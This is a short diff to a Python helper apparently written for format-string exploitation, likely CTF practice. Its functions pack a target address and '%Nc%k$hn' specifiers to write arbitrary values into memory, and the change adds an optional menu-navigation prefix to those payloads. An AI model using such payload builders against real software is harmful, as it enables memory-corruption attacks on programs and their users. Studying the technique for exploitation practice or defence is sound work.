@@ -38,6 +38,9 @@ def single_short_pattern(stackindex, writetoaddress, value, currlen=0):
 	len_1 = ((value & 0xFFFF) - currlen) & 0xFFFF
 	
 	# build and return the pattern
+	# Uncomment if you need to add a string to the beginning of the payload, such
+	# as navigating through a menu. Also change to += below that.
+	#r = "1\n1\n"
 	r =  p(writetoaddress)
 	r += '%{0}c%{1}$hn'.format(rpad_short(len_1), str(stackindex))
 
@@ -63,6 +66,9 @@ def double_short_pattern(stackindex, writetoaddress, value, currlen=0):
 	len_2 = ((((value >> 16) & 0xFFFF) - currlen) - len_1) & 0xFFFF
 	
 	# build and return the pattern
+	# Uncomment if you need to add a string to the beginning of the payload, such
+	# as navigating through a menu. Also change to += below that.
+	#r = "1\n1\n"
 	r =  p(writetoaddress)
 	r += p(writetoaddress + 2)
 	r += '%{0}c%{1}$hn'.format(rpad_short(len_1), str(stackindex))
@@ -70,7 +76,6 @@ def double_short_pattern(stackindex, writetoaddress, value, currlen=0):
 		r += '%{0}c%{1}$hn'.format(rpad_short(len_2), str(stackindex + 1))
 	else:
 		r += '%{0}$hn'.format(str(stackindex + 1))
-
 	return r
 
 # -----------------------------------------------------------------------------------
